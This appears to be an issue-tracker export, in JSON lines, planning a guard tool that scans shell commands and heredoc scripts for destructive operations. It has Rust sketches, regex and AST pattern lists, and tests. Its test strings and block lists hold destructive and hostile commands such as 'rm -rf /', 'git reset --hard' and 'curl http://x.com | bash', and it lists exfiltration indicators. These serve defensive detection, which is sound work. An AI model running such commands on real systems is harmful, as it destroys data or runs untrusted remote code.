(\"os_system\", \"os.system($CMD)\", \"Direct shell execution via os.system\"),\n    (\"subprocess_shell\", \"subprocess.run($$$ARGS, shell=True)\", \"Shell execution via subprocess\"),\n    (\"shutil_rmtree\", \"shutil.rmtree($PATH)\", \"Recursive directory deletion\"),\n    (\"exec_call\", \"exec($CODE)\", \"Dynamic code execution\"),\n    (\"eval_call\", \"eval($CODE)\", \"Dynamic code evaluation\"),\n];\n```\n\n## Error Handling\n\n```rust\npub enum MatchError {\n    UnsupportedLanguage(Language),\n    ParseError { language: Language, error: String },\n    PatternCompileError { pattern: String, error: String },\n    Timeout { elapsed_ms: u64 },\n}\n\n/// Graceful degradation on errors\nimpl AstMatcher {\n    pub fn find_matches_with_fallback(\n        \u0026self,\n        code: \u0026str,\n        language: Language,\n    ) -\u003e Result\u003cVec\u003cPatternMatch\u003e, MatchError\u003e {\n        match self.find_matches_internal(code, language) {\n            Ok(matches) =\u003e Ok(matches),\n            Err(MatchError::Timeout { .. }) =\u003e {\n                tracing::warn!(\"AST matching timed out, allowing command\");\n                Ok(vec![])  // Fail-open\n            }\n            Err(e) =\u003e Err(e),\n        }\n    }\n}\n```\n\n## Performance\n\nTarget latency:\n- Pattern compilation: One-time at startup (\u003c100ms for all languages)\n- Code parsing: \u003c2ms for typical heredoc (100 lines)\n- Pattern matching: \u003c1ms per pattern set\n- Total: \u003c5ms for full analysis\n\n## Test Cases\n\n```rust\n#[test]\nfn test_python_os_system_detection() {\n    let matcher = AstMatcher::new();\n    let code = \"import os\\nos.system('rm -rf /')\";\n    let matches = matcher.find_matches(code, Language::Python);\n    \n    assert_eq!(matches.len(), 1);\n    assert_eq!(matches[0].pattern_name, \"os_system\");\n}\n\n#[test]\nfn test_safe_python_code() {\n    let matcher = AstMatcher::new();\n    let code = \"print('hello world')\";\n    let matches = matcher.find_matches(code, Language::Python);\n    \n    assert!(matches.is_empty());\n}\n```","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:32:24.313325332-05:00","created_by":"ubuntu","updated_at":"2026-01-07T19:29:18.751557748-05:00","dependencies":[{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-5ib","type":"blocks","created_at":"2026-01-07T18:32:32.909572665-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-f4f","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T18:32:32.929896409-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-fpim","title":"Implement false positive reduction for string arguments","description":"# False Positive Reduction Implementation\n\n## Problem\n\nCurrent regex patterns match dangerous strings even in safe contexts:\n- `bd create --description=\"This blocks rm -rf\"` → BLOCKED (wrong!)\n- `git commit -m \"Fix rm -rf pattern\"` → BLOCKED (wrong!)\n- `grep \"rm -rf\" patterns.txt` → BLOCKED (wrong!)\n\n## Solution\n\nParse command structure to identify execution context before applying destructive patterns.\n\n## Implementation\n\n### 1. Safe Command Registry\n\n```rust\nstatic SAFE_STRING_ARG_COMMANDS: \u0026[(\u0026str, \u0026[\u0026str])] = \u0026[\n    (\"bd\", \u0026[\"--description\", \"--title\", \"-d\", \"-t\"]),\n    (\"git\", \u0026[\"commit -m\", \"tag -m\", \"notes add -m\"]),\n    (\"grep\", \u0026[\"-e\", \"--regexp\"]),\n    (\"rg\", \u0026[\"-e\", \"--regexp\"]),\n    (\"echo\", \u0026[]),  // all args are strings\n    (\"printf\", \u0026[]),\n];\n```\n\n### 2. Execution Context Detection\n\n```rust\nenum ExecutionContext {\n    Direct,           // Command itself is executed\n    StringArgument,   // Inside quoted string argument to safe command\n    HeredocBody,      // Inside heredoc (needs Tier 2 analysis)\n    PipeTarget,       // Right side of pipe (executed)\n    CommandSubst,     // Inside $() or backticks (executed)\n}\n\nfn detect_execution_context(cmd: \u0026str, position: usize) -\u003e ExecutionContext;\n```\n\n### 3. Integration Point\n\nModify main check flow:\n\n```rust\nfn check_command(cmd: \u0026str) -\u003e CheckResult {\n    // Quick reject (existing)\n    if global_quick_reject(cmd) {\n        return CheckResult::allowed();\n    }\n    \n    // NEW: Check if dangerous patterns are in safe context\n    if is_safe_string_context(cmd) {\n        return CheckResult::allowed();\n    }\n    \n    // Continue with heredoc detection and pattern matching...\n}\n```\n\n## Test Cases\n\n### Must ALLOW (false positive prevention)\n- `bd create --description=\"Pattern blocks rm -rf commands\"`\n- `git commit -m \"Fix git reset --hard detection\"`\n- `grep \"rm -rf\" src/patterns.rs`\n- `echo \"example: git push --force\"`\n- `rg -e \"DROP TABLE\" --type sql`\n\n### Must BLOCK (true positives preserved)\n- `rm -rf /tmp/*`\n- `git reset --hard HEAD~5`\n- `bash -c \"rm -rf /\"`\n- `echo \"hi\" | bash -c \"rm -rf /\"`\n\n## Performance\n\n- \u003c 100 microseconds additional overhead\n- Simple string prefix matching for command detection\n- No regex needed for this layer\n\n## Dependencies\n\n- Depends on: False positive design (2cu)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-fpim","depends_on_id":"git_safety_guard-2cu","type":"blocks","created_at":"2026-01-07T19:28:32.226122941-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-hcfg","title":"Add heredoc scanning configuration and CLI flags","description":"# Heredoc Scanning Configuration\n\n## Objective\n\nAllow users to configure heredoc scanning behavior via CLI flags and config file.\n\n## CLI Flags\n\n```\ndcg check [OPTIONS]\n\nHeredoc Scanning:\n    --heredoc-scan          Enable heredoc scanning (default: true)\n    --no-heredoc-scan       Disable heredoc scanning\n    --heredoc-timeout \u003cMS\u003e  Timeout for heredoc analysis (default: 50)\n    --heredoc-languages \u003cL\u003e Languages to scan (default: all)\n                            Values: python,bash,javascript,typescript,ruby,perl\n```\n\n## Config File (~/.config/dcg/config.toml)\n\n```toml\n[heredoc]\nenabled = true\ntimeout_ms = 50\nlanguages = [\"python\", \"bash\", \"javascript\", \"typescript\", \"ruby\", \"perl\"]\n\n# Graceful degradation\nfallback_on_parse_error = true  # Allow if parsing fails\nfallback_on_timeout = true       # Allow if timeout exceeded\n\n# Logging\nlog_heredoc_detection = false    # Log when heredocs detected\nlog_pattern_matches = false      # Log which patterns matched\n```\n\n## Pack Integration\n\nAdd heredoc scanning as a pack that can be enabled/disabled:\n\n```rust\n// In packs/heredoc.rs\npub fn create_pack() -\u003e Pack {\n    Pack {\n        id: \"heredoc\".to_string(),\n        name: \"Heredoc Scanning\",\n        description: \"Detect destructive patterns in inline scripts and heredocs\",\n        keywords: \u0026[\"\u003c\u003c\", \"-c\", \"-e\", \"python\", \"bash\", \"node\"],\n        safe_patterns: vec![],\n        destructive_patterns: vec![],  // Patterns defined per-language\n    }\n}\n```\n\n## Environment Variables\n\n- `DCG_HEREDOC_ENABLED=true|false`\n- `DCG_HEREDOC_TIMEOUT=50`\n- `DCG_HEREDOC_LANGUAGES=python,bash,javascript`\n\n## Default Behavior\n\n- Heredoc scanning: ENABLED by default\n- Timeout: 50ms\n- Languages: All supported\n- Fallback: Allow on error (fail-open for usability)\n\n## Test Cases\n\n- Verify --no-heredoc-scan skips heredoc detection\n- Verify timeout is respected\n- Verify language filtering works\n- Verify config file is loaded correctly\n- Verify environment variables override config","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-hcfg","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.542568801-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-jfj","title":"Design language detection heuristics","description":"# Design Language Detection Heuristics\n\n## Objective\nDesign reliable heuristics for determining the programming language of heredoc content.\n\n## Background\nTo scan heredoc content with ast-grep/tree-sitter, we need to know which language grammar to use. Language must be inferred from context clues.\n\n## Detection Sources (in priority order)\n\n### 1. Command Prefix (Most Reliable)\nMap command names to languages:\n- python, python3, python2 -\u003e Python\n- bash, sh, zsh, ksh -\u003e Bash\n- node, nodejs -\u003e JavaScript\n- ruby, irb -\u003e Ruby\n- perl -\u003e Perl\n- php -\u003e PHP\n\n### 2. Shebang Line (Heredoc Content)\nIf heredoc starts with #!, parse the interpreter:\n- #!/usr/bin/env python3 -\u003e Python\n- #!/bin/bash -\u003e Bash\n- #!/usr/bin/node -\u003e JavaScript\n\n### 3. File Extension in Command\nSome commands specify a language via temp file extension:\n- cat \u003e /tmp/script.py \u003c\u003c EOF -\u003e Python\n- This is less common but worth supporting\n\n### 4. Content Heuristics (Fallback)\nAnalyze content for language-specific patterns:\n- \"import \" at start of line -\u003e likely Python\n- \"function \" or \"const \" -\u003e likely JavaScript\n- \"def \" and \"end\" -\u003e likely Ruby\n- This is unreliable but better than nothing\n\n### 5. Configuration Override\nAllow users to specify default language for unknown heredocs.\n\n## Design Considerations\n\n### Ambiguity Handling\n- What if detection is uncertain?\n- Should we scan with multiple grammars?\n- Should we skip uncertain content?\n\n### Performance\n- Command prefix lookup should be O(1) hash map\n- Shebang detection is simple string parsing\n- Content heuristics should be bounded (first 10 lines)\n\n### Extensibility\n- Users should be able to add custom command-\u003elanguage mappings\n- New languages should be easy to add\n\n## Deliverables\n- Language detection algorithm specification\n- Command-to-language mapping table\n- Fallback strategy for unknown languages\n- Configuration schema for custom mappings\n\n## Success Criteria\n- Correctly identify language for 95%+ of real-world heredocs\n- Graceful degradation for unknown languages\n- Configuration mechanism for edge cases","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:29:39.984610362-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:29:39.984610362-05:00","dependencies":[{"issue_id":"git_safety_guard-jfj","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:29:45.118494749-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-mcf","title":"Define JavaScript/Node destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous JavaScript/Node.js constructs within heredoc bodies.\n\n## Why This Matters\n\nNode.js heredocs (node -e, node \u003c\u003cEOF) are a significant attack vector because:\n1. Node has full filesystem and process access via built-in modules\n2. npm/npx can execute arbitrary packages\n3. child_process module provides shell execution capabilities\n\n## Pattern Categories to Define\n\n### Filesystem Operations\n- fs.rmSync, fs.rmdirSync with recursive option\n- fs.unlinkSync on critical paths\n- fs.writeFileSync overwriting system files\n- rimraf and similar destructive packages\n\n### Process Execution\n- child_process.exec, execSync, spawn, spawnSync\n- Commands piped to shell interpreters\n- process.kill on system processes\n\n### Dangerous Requires/Imports\n- require('child_process')\n- Dynamic requires with user input\n- import() with untrusted paths\n\n### Network Exfiltration\n- http/https requests to unknown endpoints\n- fs.readFileSync followed by network calls\n- Buffer manipulations for data encoding\n\n### Package Manager Abuse\n- Requiring packages that execute on install\n- npx with arbitrary package names\n- Global installs of untrusted packages\n\n## Implementation Notes\n\nJavaScript patterns need to handle:\n- CommonJS vs ES modules syntax\n- async/await patterns\n- Promise chains\n- Destructuring in imports\n- Template literals\n- eval() and Function() constructors\n\nUse tree-sitter-javascript for parsing. Consider typescript patterns separately.\n\n## Test Cases\n\nEach pattern needs tests for:\n- Various import styles (require, import, dynamic import)\n- Async vs sync API variants\n- Method chaining patterns\n- Callback vs Promise vs async/await styles\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:35:33.877595699-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:35:39.971741549-05:00","dependencies":[{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:35:39.990890431-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:35:40.010899112-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-mvh","title":"Define Ruby destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Ruby constructs within heredoc bodies.\n\n## Why This Matters\n\nRuby heredocs are dangerous because:\n1. Ruby has powerful metaprogramming (eval, define_method, method_missing)\n2. Backticks and system() provide easy shell access\n3. FileUtils module has destructive filesystem operations\n4. Ruby's flexibility makes static analysis challenging\n\n## Pattern Categories to Define\n\n### Shell Execution\n- Backtick commands: `dangerous command`\n- system(), exec(), spawn() calls\n- %x{} syntax for shell commands\n- Open3 module usage\n- IO.popen for process execution\n\n### Filesystem Operations\n- FileUtils.rm_rf, FileUtils.remove_dir\n- File.delete, File.unlink\n- Dir.rmdir, Dir.delete\n- Pathname#rmtree\n\n### Metaprogramming Dangers\n- eval() and instance_eval\n- send() and public_send() with dynamic methods\n- define_method with external input\n- const_get with dynamic names\n- method_missing abuse\n\n### Kernel Methods\n- Kernel.exit!, Kernel.abort\n- Kernel.load, Kernel.require with dynamic paths\n- Kernel.fork and process manipulation\n\n### Data Exfiltration\n- Net::HTTP requests\n- open-uri with external URLs\n- Socket operations\n\n## Implementation Notes\n\nRuby parsing challenges:\n- Multiple string syntaxes (', \", %, heredocs)\n- Blocks and procs as arguments\n- Method calls without parentheses\n- Symbol to proc (\u0026:method_name)\n- Duck typing makes type inference hard\n\nUse tree-sitter-ruby for parsing.\n\n## Test Cases\n\nRuby-specific test cases:\n- Block syntax variations\n- Method chaining\n- Metaprogramming patterns\n- Different string quoting styles\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:18.506057604-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.473732741-05:00","dependencies":[{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:35.430025823-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:35.449812115-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-o15","title":"Design heredoc detection strategy","description":"# Design Heredoc Detection Strategy\n\n## Objective\nDesign a robust, performant strategy for detecting heredoc syntax in shell commands.\n\n## Background\nHeredocs appear in many forms across different shells and use cases. We need to detect when a command contains embedded script content that should be scanned for destructive patterns.\n\n## Heredoc Syntax Variants to Support\n\n### Bash/POSIX Shell\n- Basic: command \u003c\u003c DELIMITER ... DELIMITER\n- Quoted (no expansion): command \u003c\u003c 'DELIMITER' ... DELIMITER\n- Tab-stripped: command \u003c\u003c- DELIMITER ... DELIMITER\n- Here-string: command \u003c\u003c\u003c \"string\"\n\n### Other Shells\n- Zsh: same as bash plus \u003c\u003c~ for indentation stripping\n- Fish: different syntax entirely\n\n### Inline Scripts (not heredocs but similar)\n- Python -c \"code\"\n- node -e \"code\"\n- ruby -e \"code\"\n- perl -e \"code\"\n\n## Design Considerations\n\n### 1. Detection Approach\n- Regex-based quick check (fast, may have false positives)\n- Full parsing (accurate, slower)\n- Hybrid: regex for detection, parsing for extraction\n\n### 2. Content Extraction\n- How to correctly identify delimiter boundaries\n- Handling of quoted vs unquoted delimiters\n- Preservation of indentation for \u003c\u003c-\n\n### 3. Edge Cases\n- Nested heredocs\n- Heredocs in command substitution\n- Multiple heredocs in one command\n- Empty heredocs\n- Heredocs with special delimiters (containing quotes, spaces)\n\n### 4. Performance Budget\n- Detection should add \u003c 1ms to non-heredoc commands\n- Extraction should be \u003c 5ms for typical heredocs\n\n## Deliverables\n- Specification document with:\n  - Supported heredoc forms\n  - Detection algorithm\n  - Extraction algorithm\n  - Edge case handling\n  - Performance requirements\n\n## Success Criteria\n- Clear specification that can be implemented\n- Covers all common heredoc forms\n- Performance requirements are realistic and measurable\n\n## Dependencies\n- Benefits from ast-grep research (may inform approach)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:29:15.526903078-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:29:15.526903078-05:00","dependencies":[{"issue_id":"git_safety_guard-o15","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:29:24.626856626-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-perf","title":"Implement performance benchmarks for heredoc detection","description":"# Performance Benchmark Suite\n\n## Objective\n\nCreate benchmarks to measure and enforce performance budgets for heredoc detection.\n\n## Performance Budgets\n\n| Operation | Budget | Panic Threshold |\n|-----------|--------|----------------|\n| Tier 1 regex check | \u003c 10μs | \u003e 100μs |\n| Heredoc extraction | \u003c 500μs | \u003e 2ms |\n| Language detection | \u003c 50μs | \u003e 200μs |\n| AST parsing (small) | \u003c 2ms | \u003e 10ms |\n| AST parsing (large) | \u003c 10ms | \u003e 50ms |\n| Full pipeline | \u003c 15ms | \u003e 50ms |\n\n## Benchmark Implementation\n\nUsing criterion for statistical benchmarks:\n\n```rust\n// benches/heredoc_perf.rs\nuse criterion::{criterion_group, criterion_main, Criterion, BenchmarkId};\n\nfn bench_tier1_regex(c: \u0026mut Criterion) {\n    let cases = [\n        (\"simple\", \"git status\"),\n        (\"heredoc_marker\", \"python3 \u003c\u003c 'EOF'\\nprint('hi')\\nEOF\"),\n        (\"inline_script\", \"bash -c 'echo hello'\"),\n        (\"long_command\", \u0026\"x\".repeat(10000)),\n    ];\n    \n    let mut group = c.benchmark_group(\"tier1_regex\");\n    for (name, cmd) in cases {\n        group.bench_with_input(\n            BenchmarkId::new(\"might_contain_heredoc\", name),\n            cmd,\n            |b, cmd| b.iter(|| might_contain_heredoc(cmd)),\n        );\n    }\n    group.finish();\n}\n\nfn bench_full_pipeline(c: \u0026mut Criterion) {\n    // Benchmark complete heredoc check flow\n}\n\ncriterion_group!(benches, bench_tier1_regex, bench_full_pipeline);\ncriterion_main!(benches);\n```\n\n## Cargo.toml Addition\n\n```toml\n[[bench]]\nname = \"heredoc_perf\"\nharness = false\n\n[dev-dependencies]\ncriterion = \"0.5\"\n```\n\n## CI Integration\n\nAdd to CI pipeline:\n```yaml\n- name: Run benchmarks\n  run: cargo bench --bench heredoc_perf -- --noplot\n```\n\n## Regression Detection\n\nStore baseline and compare:\n```bash\n# Save baseline\ncargo bench --bench heredoc_perf -- --save-baseline main\n\n# Compare against baseline\ncargo bench --bench heredoc_perf -- --baseline main\n```\n\n## Test Data\n\nCreate fixtures:\n- `benches/fixtures/small_heredoc.txt` (10 lines)\n- `benches/fixtures/medium_heredoc.txt` (100 lines)  \n- `benches/fixtures/large_heredoc.txt` (1000 lines)\n- `benches/fixtures/real_world_samples/` (actual heredocs from the wild)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-perf","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.686523631-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-t1rx","title":"Implement Tier 1 regex heredoc detector with RegexSet","description":"# Tier 1: Fast Regex Heredoc Detection\n\n## Objective\n\nImplement the fast-path heredoc detector using Rust's `regex` crate with RegexSet for multi-pattern matching.\n\n## Why RegexSet?\n\nThe `regex` crate's RegexSet allows matching against multiple patterns simultaneously with:\n- Aho-Corasick algorithm for literal prefixes\n- SIMD acceleration (AVX2, SSE4.2)\n- Single pass through input\n- O(n) guaranteed time complexity\n\n## Patterns to Implement\n\n```rust\nstatic HEREDOC_PATTERNS: LazyLock\u003cRegexSet\u003e = LazyLock::new(|| {\n    RegexSet::new([\n        // Bash heredocs\n        r\"\u003c\u003c-?\\s*['\\\"]?\\w+['\\\"]?\",   // \u003c\u003cEOF, \u003c\u003c'EOF', \u003c\u003c-EOF\n        r\"\u003c\u003c\u003c\",                          // Here-strings\n        \n        // Inline script flags  \n        r\"\\b(python3?|python)\\s+-[ce]\\s\",\n        r\"\\b(ruby|irb)\\s+-e\\s\",\n        r\"\\bperl\\s+-[eE]\\s\",\n        r\"\\bnode\\s+-[ep]\\s\",\n        r\"\\b(sh|bash|zsh|fish)\\s+-c\\s\",\n        \n        // Pipe to interpreter\n        r\"\\|\\s*(python3?|ruby|perl|node|sh|bash)\\b\",\n        r\"\\|\\s*xargs\\s\",\n    ]).expect(\"heredoc patterns compile\")\n});\n```\n\n## API\n\n```rust\n/// Check if command might contain heredoc/inline script\n/// Returns true if ANY pattern matches (fast path triggers Tier 2)\npub fn might_contain_heredoc(cmd: \u0026str) -\u003e bool;\n\n/// Get which patterns matched (for debugging/logging)\npub fn matched_heredoc_patterns(cmd: \u0026str) -\u003e Vec\u003cusize\u003e;\n```\n\n## Performance Target\n\n- \u003c 10 microseconds for typical commands\n- Zero allocations on non-match path\n- Must have ZERO false negatives (can have false positives)\n\n## Test Cases\n\n### Must Match (true positives)\n- `python3 \u003c\u003c 'EOF'\\nprint('hi')\\nEOF`\n- `bash -c 'echo hello'`\n- `node -e \"console.log(1)\"`\n- `curl http://x.com | bash`\n- `cat \u003c\u003c EOF | python3`\n\n### Must NOT Match (true negatives)  \n- `git status`\n- `ls -la`\n- `cargo build`\n- `echo \"hello world\"`\n\n### May Match (acceptable false positives)\n- `grep -e pattern file` (has -e but not dangerous)\n- `echo \"\u003c\u003cEOF\"` (string contains heredoc marker)\n\n## Dependencies\n\n- regex = \"1.10\" (add to Cargo.toml)\n- Depends on: Two-tier architecture design (2ta)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-t1rx","depends_on_id":"git_safety_guard-2ta","type":"blocks","created_at":"2026-01-07T19:28:32.034477208-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-tlog","title":"Add detailed tracing and logging for heredoc detection","description":"# Tracing and Logging Implementation\n\n## Objective\n\nAdd comprehensive tracing using the `tracing` crate to enable debugging and monitoring of heredoc detection.\n\n## Dependencies to Add\n\n```toml\n[dependencies]\ntracing = \"0.1\"\ntracing-subscriber = { version = \"0.3\", features = [\"env-filter\"] }\n```\n\n## Log Levels\n\n- **ERROR**: Parsing failures, timeout exceeded\n- **WARN**: Fallback triggered, unknown language\n- **INFO**: Heredoc detected, command blocked/allowed\n- **DEBUG**: Pattern matches, timing details\n- **TRACE**: Full command text, AST details\n\n## Instrumentation Points\n\n### 1. Main Check Flow\n\n```rust\n#[tracing::instrument(skip(cmd), fields(cmd_len = cmd.len()))]\npub fn check_command(cmd: \u0026str) -\u003e CheckResult {\n    let start = Instant::now();\n    \n    // Quick reject\n    if global_quick_reject(cmd) {\n        tracing::trace!(\"quick_reject: no relevant keywords\");\n        return CheckResult::allowed();\n    }\n    \n    // Heredoc detection\n    if might_contain_heredoc(cmd) {\n        tracing::debug!(\"heredoc_detected: triggering Tier 2 analysis\");\n        if let Some(result) = check_heredoc(cmd) {\n            tracing::info!(\n                blocked = result.blocked,\n                reason = ?result.reason,\n                elapsed_us = start.elapsed().as_micros(),\n                \"heredoc_check_complete\"\n            );\n            return result;\n        }\n    }\n    \n    // Pattern matching...\n}\n```\n\n### 2. Heredoc Analysis\n\n```rust\n#[tracing::instrument(skip(cmd))]\nfn check_heredoc(cmd: \u0026str) -\u003e Option\u003cCheckResult\u003e {\n    let extraction_start = Instant::now();\n    let heredoc = extract_heredoc(cmd)?;\n    tracing::debug!(\n        extraction_us = extraction_start.elapsed().as_micros(),\n        content_len = heredoc.content.len(),\n        \"heredoc_extracted\"\n    );\n    \n    let lang = detect_language(\u0026heredoc);\n    tracing::debug!(language = ?lang, \"language_detected\");\n    \n    let parse_start = Instant::now();\n    let matches = match_patterns(\u0026heredoc.content, lang);\n    tracing::debug!(\n        parse_us = parse_start.elapsed().as_micros(),\n        match_count = matches.len(),\n        \"patterns_checked\"\n    );\n    \n    // ...\n}\n```\n\n### 3. Error Handling\n\n```rust\nmatch parse_with_ast_grep(\u0026content, lang) {\n    Ok(ast) =\u003e { /* ... */ }\n    Err(e) =\u003e {\n        tracing::warn!(\n            error = %e,\n            language = ?lang,\n            \"ast_parse_failed: falling back to allow\"\n        );\n        return None;  // Fail-open\n    }\n}\n```\n\n## Environment Variable Control\n\n```bash\n# Enable all heredoc tracing\nRUST_LOG=dcg::heredoc=debug dcg check\n\n# Enable timing info only\nRUST_LOG=dcg=info dcg check\n\n# Full trace (very verbose)\nRUST_LOG=dcg=trace dcg check\n```\n\n## JSON Structured Logging\n\nFor machine parsing:\n\n```rust\ntracing_subscriber::fmt()\n    .json()\n    .with_env_filter(EnvFilter::from_default_env())\n    .init();\n```\n\nOutput:\n```json\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"DEBUG\",\"target\":\"dcg::heredoc\",\"message\":\"heredoc_detected\",\"cmd_len\":156,\"tier\":1}\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"DEBUG\",\"target\":\"dcg::heredoc\",\"message\":\"language_detected\",\"language\":\"Python\"}\n{\"timestamp\":\"2026-01-07T19:30:45Z\",\"level\":\"INFO\",\"target\":\"dcg::heredoc\",\"message\":\"command_blocked\",\"reason\":\"os.system with shell command\",\"elapsed_us\":1234}\n```\n\n## Performance Impact\n\n- Logging disabled: Zero overhead (tracing uses static dispatch)\n- INFO level: \u003c 1μs per log call\n- DEBUG level: \u003c 5μs per log call\n- TRACE level: Variable (includes data serialization)\n\n## Test Verification\n\nAdd tests that verify logging output:\n\n```rust\n#[test]\nfn test_heredoc_logging() {\n    let (writer, handle) = tracing_test::subscriber();\n    tracing::subscriber::with_default(writer, || {\n        check_command(\"python3 \u003c\u003c 'EOF'\\nimport os\\nos.system('rm -rf /')\\nEOF\");\n    });\n    \n    let logs = handle.into_string();\n    assert!(logs.contains(\"heredoc_detected\"));\n    assert!(logs.contains(\"language_detected\"));\n    assert!(logs.contains(\"Python\"));\n}","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-tlog","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:33.00690866-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-uau","title":"Define Bash/Shell destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Bash/Shell constructs within heredoc bodies.\n\n## Why This Matters\n\nBash heredocs are the most common attack vector because:\n1. bash -c, sh -c are extremely common command forms\n2. Shell scripts can invoke ANY system command\n3. Existing dcg regex patterns already target many shell commands - we need equivalent AST patterns\n\n## Pattern Categories to Define\n\n### File/Directory Destruction\n- recursive forced removal patterns\n- rmdir on critical directories\n- find with delete patterns\n- Wildcards in destructive contexts\n\n### Git Destructive Operations\n- hard reset patterns\n- forced clean patterns\n- force push to protected branches\n- force branch deletion\n\n### Permission/Ownership Changes\n- chmod 777 on system paths\n- chown root or changing critical file ownership\n- setfacl manipulations\n\n### System Administration\n- mkfs, fdisk, dd commands on devices\n- service/systemctl stop on critical services\n- kill -9 on system processes\n- shutdown, reboot, halt\n\n### Data Exfiltration Indicators\n- curl/wget piped to shell\n- base64 encoding of sensitive files\n- tar/zip of home directories or /etc\n\n## Implementation Notes\n\nShell parsing is complex due to:\n- Quoting rules (single, double, command substitution)\n- Variable expansion\n- Command substitution\n- Heredocs within heredocs\n- Arrays and special variables\n\nStart with tree-sitter-bash and test each pattern against real shell scripts to validate accuracy.\n\n## Test Cases\n\nEach pattern needs positive tests (should match) and negative tests (should not match) covering:\n- Common benign uses that look similar\n- Quoting variations\n- Variable indirection\n- Command aliasing\n\n## Dependencies\n\n- Pattern library structure design (how patterns are organized)\n- ast-grep invocation layer (how to run ast-grep on content)\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:34:59.51511691-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:35:04.976948155-05:00","dependencies":[{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:35:11.201594037-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-uau","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:35:11.220201218-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-unit","title":"Create comprehensive unit test suite for heredoc detection","description":"# Unit Test Suite for Heredoc Detection\n\n## Objective\n\nCreate thorough unit tests for each component of the heredoc detection system.\n\n## Test Modules\n\n### 1. Tier 1 Regex Tests (`tests/tier1_regex.rs`)\n\n```rust\nmod tier1_regex_tests {\n    use super::*;\n    \n    #[test]\n    fn test_bash_heredoc_variants() {\n        // Standard heredoc\n        assert!(might_contain_heredoc(\"cat \u003c\u003c EOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003cEOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c 'EOF'\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c \\\"EOF\\\"\"));\n        \n        // Indented heredoc\n        assert!(might_contain_heredoc(\"cat \u003c\u003c- EOF\"));\n        assert!(might_contain_heredoc(\"cat \u003c\u003c-EOF\"));\n        \n        // Here-string\n        assert!(might_contain_heredoc(\"cat \u003c\u003c\u003c 'hello'\"));\n    }\n    \n    #[test]\n    fn test_inline_script_flags() {\n        // Python\n        assert!(might_contain_heredoc(\"python -c 'print(1)'\"));\n        assert!(might_contain_heredoc(\"python3 -c 'print(1)'\"));\n        assert!(might_contain_heredoc(\"python -e 'print(1)'\")); // -e not valid but we catch\n        \n        // Node.js\n        assert!(might_contain_heredoc(\"node -e 'console.log(1)'\"));\n        